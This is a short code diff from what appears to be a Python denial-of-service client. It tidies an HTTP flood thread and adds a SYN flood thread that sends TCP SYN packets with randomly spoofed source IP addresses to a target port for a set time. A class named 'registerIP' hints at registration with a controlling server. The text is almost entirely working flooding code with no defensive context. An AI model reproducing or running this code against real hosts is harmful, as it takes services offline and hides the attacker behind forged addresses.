@@ -38,16 +38,40 @@ class attackUDPFlood(threading.Thread):
 class attackHTTPFlood(threading.Thread):
     def __init__(self, **kwargs):
         threading.Thread.__init__(self)
-        self.timeoutAttack = kwargs['timeout']
+        self.timeout = kwargs['timeout']
         self.target = kwargs['target']
 
     def run(self):
         start = time.time()
-        while time.time() - start < self.timeoutAttack:
+        while time.time() - start < self.timeout:
             try:
                 res = urllib2.urlopen(self.target)
             except IOError:
                 print "Could not open ", self.target
+
+class attackSYNFlood(threading.Thread):
+    def __init__(self, **kwargs):
+        threading.Thread.__init__(self)
+        self.timeout = kwargs['timeout']
+        self.target = kwargs['target']
+        self.port = int(kwargs['port'])
+
+    def run(self):
+        start = time.time()
+        while time.time() - start < self.timeout:
+            ip = IP()
+            ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
+                                     random.randint(1,254),
+                                     random.randint(1,254),
+                                     random.randint(1,254))
+            ip.dst = self.target
+
+            tcp = TCP()
+            tcp.sport = random.randint(1,65535)
+            tcp.dport = self.port
+            tcp.flags = 'S'
+
+            send(ip/tcp, verbose = 0)
 
 class registerIP(threading.Thread):
     def __init__(self, HOST, PORT):
